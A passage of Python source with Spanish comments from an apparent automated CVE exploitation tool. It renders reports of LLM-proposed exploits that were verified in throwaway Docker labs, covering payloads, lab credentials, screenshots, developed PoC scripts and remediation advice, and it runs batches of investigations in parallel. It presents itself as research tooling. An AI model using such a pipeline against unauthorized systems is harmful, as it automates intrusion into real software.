            f"CVE: {inv.cve_id}\n"
            f"Clase: {inv.vuln_class or '?'}\n"
            f"CVSS: {inv.cvss_score or '?'} ({inv.cvss_severity or '?'})\n"
            f"Resultado: {_status}\n"
            + (f"Detalle: {_detail}\n" if _detail else "")
            + (f"Payload: {inv.verified_evidence.get('payload_ganador', '')}\n"
               if inv.verified and inv.verified_evidence else "")
        )
        _term_png = _screenshot_terminal_step(
            title=f"{inv.cve_id} · {_status}",
            content=_term_content,
            highlight=_status,
            lang=lang,
        )
        if _term_png:
            inv.verified_evidence = inv.verified_evidence or {}
            inv.verified_evidence.setdefault("screenshots", [])
            shots = inv.verified_evidence["screenshots"]
            shots.insert(0, {
                "png_b64": _term_png,
                "caption_es": f"Estado final de la investigacion en terminal: {_status}",
                "caption_en": f"Final investigation status in terminal: {_status}",
            })
    except Exception:
        pass

    save_investigation_to_cache(inv)
    return inv


def render_investigation(inv: Investigation, lang: str = "es", embed_images: bool = True) -> str:
    """`embed_images=False` sustituye cada captura por un aviso corto en vez del PNG en base64
    completo -- para la salida de TERMINAL, que no puede pintar imagenes y donde el base64
    (decenas de KB por captura) es solo ruido ilegible. render_investigation_page() (el export
    HTML, que SI las pinta) sigue llamando con embed_images=True (el valor por defecto)."""
    es = lang == "es"
    out = ["## " + ("Investigacion de explotacion" if es else "Exploitation investigation")
           + f": {inv.cve_id}"]

    # resumen ejecutivo: lo primero que lee alguien que no va a leer el informe entero --
    # severidad real (CVSS de NVD si consta, si no la de nuestra tabla por clase), estado
    # (verificado de verdad en sandbox o no), fecha de publicacion, y el impacto en una frase.
    # pensado para que sea legible fuera de contexto (p.ej. pegado en un ticket o un email).
    fallback_impact = _IMPACT_BY_CLASS.get(inv.vuln_class)
    if inv.cvss_score is not None:
        sev_label = f"CVSS {inv.cvss_score:.1f} ({inv.cvss_severity or '?'})"
    elif fallback_impact:
        sev_label = (fallback_impact[0] if es else fallback_impact[2]) + (
            " (" + ("estimado por tipo de vulnerabilidad, sin CVSS de NVD" if es else
                    "estimated from vulnerability type, no NVD CVSS") + ")")
    else:
        sev_label = "?"
    estado_label = (("VERIFICADO en sandbox" if es else "VERIFIED in sandbox") if inv.verified
                    else (("intentado, no confirmado" if es else "attempted, not confirmed")
                          if inv.dynamic_verify.get("attempted")
                          else ("no verificado dinamicamente" if es else "not dynamically verified")))
    out.append("\n### " + ("Resumen ejecutivo" if es else "Executive summary"))
    out.append("| " + ("Campo" if es else "Field") + " | " + ("Valor" if es else "Value") + " |")
    out.append("|---|---|")
    out.append("| " + ("Severidad" if es else "Severity") + f" | {sev_label} |")
    out.append("| " + ("Clase de vulnerabilidad" if es else "Vulnerability class")
               + f" | {inv.vuln_class or '?'} |")
    out.append("| " + ("Estado" if es else "Status") + f" | {estado_label} |")
    if inv.published:
        out.append("| " + ("Publicada (NVD)" if es else "Published (NVD)") + f" | {inv.published} |")
    if inv.cvss_vector:
        out.append("| " + ("Vector CVSS" if es else "CVSS vector") + f" | `{inv.cvss_vector}` |")
    if fallback_impact:
        out.append("| " + ("Impacto" if es else "Impact")
                   + f" | {fallback_impact[1] if es else fallback_impact[3]} |")

    if inv.description:
        out.append("\n" + inv.description.strip())
    if inv.lookup_ok:
        pub = ("HUECO (no consta)" if es else "GAP (none)") if inv.is_gap else ("existe" if es else "exists")
    else:
        # el motivo REAL (formato invalido / sin red / rate-limit...) lo da fetch_cve(); mostrar
        # siempre "no es un id CVE" aqui era enganoso cuando el id era valido pero la consulta
        # fallo por red (confirmado: una CVE real con NVD bloqueada por proxy decia "not a CVE id").
        pub = (inv.lookup_note or ("no consultado" if es else "not checked"))
    out.append("\n- " + ("Estado exploit publico: " if es else "Public exploit: ") + pub)
    if inv.poc_source_used:
        out.append("- " + ("PoC publico leido: " if es else "Public PoC read: ") +
                   f"[{inv.poc_source_used}]({inv.poc_source_used}) -- " +
                   ("los datos de abajo vienen del exploit YA publicado, no solo de una hipotesis "
                    "del LLM a partir del resumen de la CVE" if es else
                    "the data below comes from the ALREADY published exploit, not just an LLM "
                    "hypothesis from the CVE summary"))
    out.append("- " + ("Clase: " if es else "Class: ") + (inv.vuln_class or "?"))
    impact = _IMPACT_BY_CLASS.get(inv.vuln_class)
    if impact:
        sev_es, txt_es, sev_en, txt_en = impact
        sev, txt = (sev_es, txt_es) if es else (sev_en, txt_en)
        out.append("\n### " + ("Impacto" if es else "Impact"))
        out.append(f"\n> **[{sev}]** {txt}")
    if inv.llm_notes:
        out.append("\n### " + ("Investigacion del LLM (hipotesis)" if es else "LLM research (hypothesis)"))
        for k in ("primitive", "target_binary", "trigger", "strategy", "source_url",
                  "affected_version", "vulnerable_functions", "http_method", "endpoint",
                  "parameters", "auth_required", "payload_example", "poc_notes", "setup_options"):
            v = inv.llm_notes.get(k)
            if v:
                v = ", ".join(v) if isinstance(v, list) and v and isinstance(v[0], str) else v
                v = ", ".join(f"{o.get('name')}={o.get('value')}" for o in v) if (
                    isinstance(v, list) and v and isinstance(v[0], dict)) else v
                out.append(f"- **{k}**: {v}")
        steps = inv.llm_notes.get("steps")
        if isinstance(steps, list) and steps:
            out.append("- " + ("pasos" if es else "steps") + ":")
            for i, s in enumerate(steps, 1):
                if isinstance(s, dict):        # algunos modelos devuelven {"step": "..."}
                    s = s.get("step") or s.get("action") or next(iter(s.values()), str(s))
                out.append(f"  {i}. {s}")
    if inv.trigger:
        out.append("- " + ("Disparador descubierto (auto-fuzzing): " if es else
                           "Trigger discovered (auto-fuzzing): ") + f"`{inv.trigger}`")
    if inv.source_fetch:
        sf = inv.source_fetch
        out.append("\n### " + ("Codigo fuente" if es else "Source code"))
        if sf.get("ok"):
            out.append("- " + (f"obtenido ({sf.get('kind')}, version {sf.get('resolved_version') or '?'}): "
                               f"`{sf.get('local_path')}`" if es else
                               f"fetched ({sf.get('kind')}, version {sf.get('resolved_version') or '?'}): "
                               f"`{sf.get('local_path')}`"))
            g = inv.source_grounding or {}
            for name, locs in (g.get("found") or {}).items():
                out.append(f"  - **GROUNDED** `{name}` -> " + ", ".join(locs[:5])
                           + (f"  (+{len(locs)-5})" if len(locs) > 5 else ""))
            if g.get("not_found"):
                out.append("  - " + ("no localizadas: " if es else "not found: ")
                           + ", ".join(g["not_found"]))
        else:
            out.append("- " + (f"no obtenido: {sf.get('note')}" if es else
                               f"not fetched: {sf.get('note')}"))
    if inv.verified:
        out.append("\n> **" + ("EXPLOIT VERIFICADO" if es else "VERIFIED EXPLOIT")
                   + "** (sandbox): " + inv.verified_detail)
        if inv.verified_evidence:
            ev = inv.verified_evidence
            out.append("\n### " + ("Evidencia real de la ejecucion" if es else
                                   "Real evidence from the run"))
            out.append(("_Datos reales de la ejecucion que SE CONFIRMO de verdad -- no una "
                        "plantilla. Si fue un laboratorio efimero (Docker), ya esta destruido: "
                        "estas credenciales/rutas no abren nada, se muestran como prueba de que "
                        "el flujo corrio de verdad, no que se simulo._" if es else
                        "_Real data from the run that WAS ACTUALLY CONFIRMED -- not a template. "
                        "If it was an ephemeral (Docker) lab, it's already torn down: these "
                        "credentials/paths unlock nothing, shown as proof the flow really ran, "
                        "not that it was simulated._"))
            # bug real confirmado en vivo investigando CVE-2025-64756 (glob npm CLI): esta tabla
            # solo conocia la FORMA concreta del account-takeover de wpverify.py
            # (login_bajo_privilegio/admin_user/...) -- cualquier otro verificador (command
            # injection/SQLi/SSRF/SSTI/path-traversal en wpverify.py/drupalverify.py/
            # genericverify.py, DECENAS de sitios reales que guardan `payload_ganador` en
            # evidence) se quedaba SIN NINGUNA fila de prueba en el informe, y el filtro de
            # "None" tampoco atrapaba cadenas COMPUESTAS como "`None` (id=None)" -- asi que un
            # CVE verificado de verdad por una de esas clases mostraba filas falsas rotuladas
            # "WordPress" con `None` por todos lados en vez de la prueba real que SI se calculo.
            rows = []
            if ev.get("login_bajo_privilegio") or ev.get("admin_user"):
                rows += [
                    (("Usuario de bajo privilegio" if es else "Low-privilege user"),
                     f"`{ev.get('login_bajo_privilegio')}` / `{ev.get('login_bajo_privilegio_password')}`"),
                    (("Admin objetivo (laboratorio)" if es else "Target admin (lab)"),
                     f"`{ev.get('admin_user')}` (id={ev.get('admin_id')})"),
                    (("Parametros (rol -> nombre real)" if es else "Parameters (role -> real name)"),
                     ", ".join(f"{role}={name}" for role, name in
                              (("id", ev.get("id_param")), ("email", ev.get("email_param")),
                               ("password", ev.get("pass_param"))) if name)),
                ]
                if ev.get("password_nueva_confirmada"):
                    rows.append((("Password fijada y CONFIRMADA por segundo login" if es else
                                 "Password set and CONFIRMED by second login"),
                                f"`{ev['password_nueva_confirmada']}`"))
                if ev.get("email_nuevo_confirmado"):
                    rows.append((("Email fijado y CONFIRMADO leyendo el usuario" if es else
                                 "Email set and CONFIRMED by reading the user"),
                                f"`{ev['email_nuevo_confirmado']}` (leido: `{ev.get('email_leido_tras_ataque')}`)"))
            if ev.get("endpoint") and (ev.get("metodo") or ev.get("http_method")):
                rows.append((("Peticion enviada" if es else "Request sent"),
                            f"`{ev.get('metodo') or ev.get('http_method')} {ev.get('endpoint')}`"))
            if ev.get("payload_enviado"):
                rows.append((("Payload real" if es else "Real payload"),
                            f"`{ev.get('payload_enviado')}`"))
            if ev.get("status_code_respuesta") is not None:
                rows.append((("Codigo de respuesta" if es else "Response status"),
                            str(ev.get("status_code_respuesta"))))
            # parametro/payload ganador: la prueba real de command injection/SQLi/SSRF/SSTI/
            # path-traversal en wpverify.py/drupalverify.py/genericverify.py (ver arriba) -- antes
            # de este fix, NUNCA se mostraba en el informe pese a calcularse siempre.
            if ev.get("payload_ganador") or ev.get("parametro_ganador"):
                rows.append((("Parametro/payload que confirmo la vulnerabilidad" if es else
                             "Parameter/payload that confirmed the vulnerability"),
                            f"`{ev.get('parametro_ganador') or '?'}` = `{ev.get('payload_ganador')}`"))
            if ev.get("canary_path") or ev.get("canary_secret"):
                rows.append((("Canario (fichero/secreto)" if es else "Canary (file/secret)"),
                            f"`{ev.get('canary_path') or ''}` -- `{ev.get('canary_secret') or ''}`"))
            # forma de verify_cli_filename_command_injection (cliverify.py): sin endpoint/sesion,
            # un comando de preparacion + un comando de ejecucion sobre un fichero-payload local.
            if ev.get("run_cmd") and ev.get("canary_name"):
                rows += [
                    (("Comando de preparacion (entorno descartable)" if es else
                     "Setup command (disposable environment)"), f"`{ev.get('setup_cmd')}`"),
                    (("Comando ejecutado" if es else "Command run"), f"`{ev.get('run_cmd')}`"),
                    (("Fichero-payload plantado (su NOMBRE es el payload)" if es else
                     "Payload file planted (its NAME is the payload)"),
                     f"`{ev.get('payload_filename')}`"),
                    (("Canario confirmado" if es else "Canary confirmed"),
                     f"`{ev.get('canary_name')}` ({ev.get('canario_presente')})"),
                ]
            for label, value in rows:
                if value and "None" not in value:
                    out.append(f"- **{label}**: {value}")
        shots = (inv.verified_evidence or {}).get("screenshots") or []
        if shots:
            out.append("\n" + ("**Capturas de pantalla, paso a paso (evidencia visual real, "
                               "navegador headless contra el laboratorio efimero):**" if es else
                               "**Step-by-step screenshots (real visual evidence, headless "
                               "browser against the ephemeral lab):**"))
            for sh in shots:
                caption = sh.get("caption_es" if es else "caption_en") or ""
                png = sh.get("png_b64")
                if not png:
                    continue
                out.append(f"\n_{caption}_")
                if sh.get("url"):
                    out.append(("- Peticion capturada: " if es else "- Request captured: ")
                               + f"`GET {sh['url']}`")
                if embed_images:
                    out.append(f"![paso]({_B64_PNG_PREFIX}{png})")
                else:
                    kb = len(png) * 3 // 4 // 1024   # tamano real aprox. (base64 -> bytes)
                    out.append((f"[captura disponible, ~{kb} KB -- usa --html/-o para exportar el "
                               f"informe completo con las imagenes, el terminal no las puede "
                               f"pintar]" if es else
                               f"[screenshot available, ~{kb} KB -- use --html/-o to export the "
                               f"full report with images, the terminal cannot render them]"))
        elif inv.dynamic_verify.get("attempted"):
            out.append(("\n_(sin captura de pantalla: Playwright no esta disponible en este "
                       "contenedor -- la evidencia textual de arriba, el payload/password/"
                       "status code reales, es igualmente valida sin ella)_" if es else
                       "\n_(no screenshot: Playwright is not available in this container -- "
                       "the textual evidence above, the real payload/password/status code, "
                       "is equally valid without it)_"))
    # bug real encontrado en vivo, CVE-2024-1071: el laboratorio efimero capturaba varias
    # pantallas reales (WordPress instalado, plugin activo, usuario de bajo privilegio creado)
    # ANTES de bloquearse mas adelante (login fallido) -- pero se perdian porque solo se
    # mostraban capturas cuando inv.verified=True. Esto muestra las que SI se capturaron, como
    # evidencia de hasta donde llego el intento real, aunque no se haya confirmado del todo.
    if not inv.verified:
        attempt_shots = (inv.attempt_evidence or {}).get("screenshots") or []
        if attempt_shots:
            out.append("\n### " + ("Evidencia visual del intento (laboratorio efimero, hasta "
                                   "donde llego antes del bloqueo)" if es else
                                   "Visual evidence from the attempt (ephemeral lab, as far as "
                                   "it got before the blocker)"))
            out.append(("_Capturas reales del laboratorio desechable, en el punto exacto donde "
                        "cada paso se completo -- el laboratorio ya esta destruido._" if es else
                        "_Real screenshots from the throwaway lab, at the exact point each step "
                        "completed -- the lab is already torn down._"))
            for sh in attempt_shots:
                caption = sh.get("caption_es" if es else "caption_en") or ""
                png = sh.get("png_b64")
                if not png:
                    continue
                out.append(f"\n_{caption}_")
                if sh.get("url"):
                    out.append(("- Peticion capturada: " if es else "- Request captured: ")
                               + f"`GET {sh['url']}`")
                if embed_images:
                    out.append(f"![paso]({_B64_PNG_PREFIX}{png})")
                else:
                    kb = len(png) * 3 // 4 // 1024
                    out.append((f"[captura disponible, ~{kb} KB -- usa --html/-o para exportar el "
                               f"informe completo con las imagenes]" if es else
                               f"[screenshot available, ~{kb} KB -- use --html/-o to export the "
                               f"full report with images]"))
    if inv.blockers:
        out.append("\n### " + ("Bloqueos para el exploit real" if es else "Blockers for a real exploit"))
        out += [f"- {b}" for b in inv.blockers]
    if inv.developed_script:
        if inv.poc_kind == "http":
            title = "PoC desarrollado (HTTP / curl)" if es else "Developed PoC (HTTP / curl)"
            fence = "bash"
        elif inv.poc_kind == "html":
            title = "PoC desarrollado (CSRF, pagina HTML)" if es else "Developed PoC (CSRF, HTML page)"
            fence = "html"
        else:
            title = "Exploit desarrollado (pwntools)" if es else "Developed exploit (pwntools)"
            fence = "python"
        out.append(f"\n### {title}\n```{fence}\n" + inv.developed_script + "\n```")

    # recomendaciones: lo que un cliente/equipo de desarrollo necesita para CERRAR el hallazgo,
    # no solo para entenderlo -- siempre que haya una clase de vulnerabilidad identificada,
    # independientemente de si llego a VERIFICARSE o se quedo en bloqueo (el riesgo del hallazgo
    # no depende de que binoracle haya podido confirmarlo end-to-end en este sandbox concreto).
    remediation = _REMEDIATION_BY_CLASS.get(inv.vuln_class)
    _notes = inv.llm_notes or {}
    target = _notes.get("target_binary") or _notes.get("source_url")
    if not target:
        # Intentar extraer el nombre del componente de la descripcion NVD: primera palabra
        # capitalizada que no sea ruido (articulos, verbos modales, terminos genéricos)
        _NOISE = {
            "this", "the", "that", "with", "when", "before", "after", "allow", "allows",
            "could", "would", "should", "version", "versions", "product", "component",
            "vulnerability", "vulnerabilities", "issue", "issues", "attack", "attacker",
            "remote", "local", "through", "plugin", "module", "package", "library",
            "affected", "fixed", "patched", "bypass", "causes", "within",
        }
        for _cand in re.findall(r'\b([A-Z][A-Za-z0-9._-]{2,30})\b', inv.description or ""):
            if _cand.lower() not in _NOISE:
                target = _cand
                break
    affected = _notes.get("affected_version")
    _target_es = target or "el componente afectado"
    _target_en = target or "the affected component"
    if remediation or target:
        out.append("\n### " + ("Recomendaciones" if es else "Recommendations"))
        out.append("1. " + (
            f"Actualizar {_target_es} a la version mas reciente disponible"
            + (f" (version afectada identificada: {affected})" if affected else "")
            + ", comprobando en el changelog/advisory del proveedor que corrige esta CVE "
              "concreta -- es la mitigacion mas directa cuando la vulnerabilidad esta en un "
              "componente de terceros." if es else
            f"Update {_target_en} to the latest available version"
            + (f" (identified affected version: {affected})" if affected else "")
            + ", confirming in the vendor's changelog/advisory that it fixes this specific "
              "CVE -- the most direct mitigation when the vulnerability is in a third-party "
              "component."))
        if remediation:
            out.append("2. " + (remediation[0] if es else remediation[1]))
        out.append(("3. Si actualizar no es viable de inmediato, valorar una regla de WAF/"
                    "mitigacion temporal especifica para el patron de ataque mientras se "
                    "despliega el parche, y restringir el acceso al endpoint afectado a quien "
                    "realmente lo necesite." if es else
                    "3. If updating is not immediately viable, consider a specific temporary "
                    "WAF rule/mitigation for the attack pattern while the patch is deployed, "
                    "and restrict access to the affected endpoint to those who actually need it."))
    out.append("\n_" + ("El LLM propone e investiga; el sandbox decide lo VERIFICADO. Solo objetivos "
                        "autorizados / CTF / research." if es else
                        "The LLM proposes and investigates; the sandbox decides what is VERIFIED. "
                        "Authorized / CTF / research only.") + "_")
    return "\n".join(out)


_BATCH_MAX_PARALLEL = 6   # tope duro -- cada investigacion puede levantar su propio laboratorio
# WordPress+MySQL en Docker; mas que esto en una maquina normal (Apple Silicon, Docker Desktop)
# es mas probable que la reviente de RAM/CPU que acelerar nada.


@dataclass
class BatchItem:
    """Resultado de UNA investigacion dentro de un lote (ver investigate_cves_batch) -- aislado a
    proposito: que esta CVE falle (red, parseo, lo que sea) no debe tumbar las demas del lote, asi
    que el error (si lo hay) se queda aqui, nunca se propaga fuera del lote."""
    cve_id: str
    status: str = "pending"      # pending | running | done | error
    investigation: Optional[Investigation] = None
    error: str = ""
    elapsed_s: float = 0.0


def investigate_cves_batch(
    cve_ids: List[str], config=None, lang: str = "es", budget_s: float = 300.0,
    parallel: int = 2, hints_by_cve: Optional[dict] = None,
    on_event: Optional[Callable[[dict], None]] = None, use_cache: bool = True,
) -> List[BatchItem]:
    """Lanza investigate_cve() para cada id de `cve_ids` EN PARALELO, con un pool de hilos acotado
    por `parallel`, y aisla los errores por CVE -- uno fallando (red, excepcion inesperada, lo que
    sea) no tumba el resto del lote, se queda registrado en su propio BatchItem.error.

    Seguro de correr varias investigaciones de verdad a la vez, no solo en teoria:
    - cada laboratorio Docker efimero (wpverify.py/drupalverify.py/joomlaverify.py/genericverify.py)
      usa nombres de red/volumen/contenedor ALEATORIOS (_token(), 8 caracteres hex) y publica el
      puerto de WordPress/Drupal/Joomla en uno aleatorio del host -- dos laboratorios en paralelo
      nunca chocan de recursos.
    - BurpMCPClient (burpmcp.py) ya soporta llamadas concurrentes desde varios hilos: su bucle de
      eventos asyncio corre en un hilo de fondo propio y call_tool()/connect() usan
      asyncio.run_coroutine_threadsafe(), pensado justo para que varios hilos Python puedan
      llamarlo a la vez sin pisarse -- si configuraste --burp-mcp-url, lo comparten todas las
      investigaciones del lote sin problema.
    - cada investigate_cve() crea su PROPIO backend de LLM (make_backend(config), nunca
      compartido entre hilos) para no asumir que el cliente HTTP subyacente sea thread-safe.

    Lo unico que SI comparten varias investigaciones de verdad a la vez es la CPU/RAM real de la
    maquina (cada laboratorio WordPress+MySQL bajo emulacion en Apple Silicon pesa) y, si lo usas,
    el propio Burp Suite (una sola app recibiendo el trafico de todas) -- por eso `parallel` tiene
    un tope prudente por defecto y un maximo duro (_BATCH_MAX_PARALLEL), no es ilimitado.

    `on_event(event)` opcional recibe, en tiempo real y desde CUALQUIER hilo del lote, un dict
    {"cve_id", "type": "start"|"step"|"finish", ...} -- "step" trae "message" (el mismo texto que
    on_step recibiria en una investigacion suelta), "finish" trae "status"/"elapsed_s"/"error".
    Pensado para pintar progreso en vivo sin esperar a que termine el lote entero; si no se da, la
    funcion sigue funcionando en silencio y solo devuelve la lista de BatchItem al final."""
    from ..config import load_config

    config = config or load_config()
    parallel = max(1, min(int(parallel or 1), _BATCH_MAX_PARALLEL))
    hints_by_cve = hints_by_cve or {}
    items = {cid: BatchItem(cve_id=cid) for cid in cve_ids}

    def _emit(event: dict):
        if on_event:
            try:
                on_event(event)
            except Exception:
                pass   # un fallo pintando progreso no debe tumbar la investigacion de verdad

    def _run_one(cve_id: str):
        item = items[cve_id]
        item.status = "running"
        _emit({"cve_id": cve_id, "type": "start"})
        t0 = time.time()

        def step(message: str):
            _emit({"cve_id": cve_id, "type": "step", "message": message})

        try:
            inv = investigate_cve(cve_id, config=config, on_step=step, lang=lang,
                                  budget_s=budget_s, hints=hints_by_cve.get(cve_id),
                                  use_cache=use_cache)
            item.investigation = inv
            item.status = "done"
        except Exception as e:
            item.error = f"{type(e).__name__}: {e}"
            item.status = "error"
        item.elapsed_s = time.time() - t0
        _emit({"cve_id": cve_id, "type": "finish", "status": item.status,
              "elapsed_s": item.elapsed_s, "error": item.error})

    with ThreadPoolExecutor(max_workers=parallel) as pool:
        futures = [pool.submit(_run_one, cid) for cid in cve_ids]
        for f in futures:
            f.result()   # _run_one ya atrapa todo -- esto solo re-lanzaria un fallo de verdad
                         # inesperado en la propia orquestacion, nunca el de una investigacion

    return [items[cid] for cid in cve_ids]


def render_batch_summary(items: List["BatchItem"], lang: str = "es") -> str:
    """Tabla resumen en markdown de un lote (ver investigate_cves_batch) -- CVE, clase, estado del
    exploit publico, si quedo VERIFICADO, tiempo, y el error si lo hubo. Pensada para ver de un
    vistazo cual de varias CVEs merece la pena mirar en detalle, sin leer cada informe completo."""
    es = lang == "es"
    headers = (["CVE", "Clase", "Exploit publico", "Verificado", "Tiempo", "Error"] if es else
              ["CVE", "Class", "Public exploit", "Verified", "Time", "Error"])
    rows = [headers, ["---"] * len(headers)]
    verified_n = 0
    error_n = 0
    for it in items:
        elapsed = f"{it.elapsed_s:.0f}s"
        if it.status == "error":
            error_n += 1
            rows.append([it.cve_id, "?", "?", "?", elapsed, it.error[:80].replace("|", "/")])
            continue
        inv = it.investigation
        if inv is None:
            rows.append([it.cve_id, "?", "?", "?", elapsed, ""])
            continue
        pub = ("existe" if es else "exists") if (inv.lookup_ok and not inv.is_gap) else (
              ("HUECO" if es else "GAP") if (inv.lookup_ok and inv.is_gap) else "?")
        verified = ("SI" if es else "YES") if inv.verified else "no"
        if inv.verified:
            verified_n += 1
        rows.append([it.cve_id, (inv.vuln_class or "?").replace("|", "/"), pub, verified,
                    elapsed, ""])
    table = "\n".join("| " + " | ".join(r) + " |" for r in rows)
    summary = (f"**{verified_n}/{len(items)} verificadas**" if es else
              f"**{verified_n}/{len(items)} verified**")
    if error_n:
        summary += (f", {error_n} con error" if es else f", {error_n} errored")
    return "## " + ("Resumen del lote" if es else "Batch summary") + f"\n\n{table}\n\n{summary}"
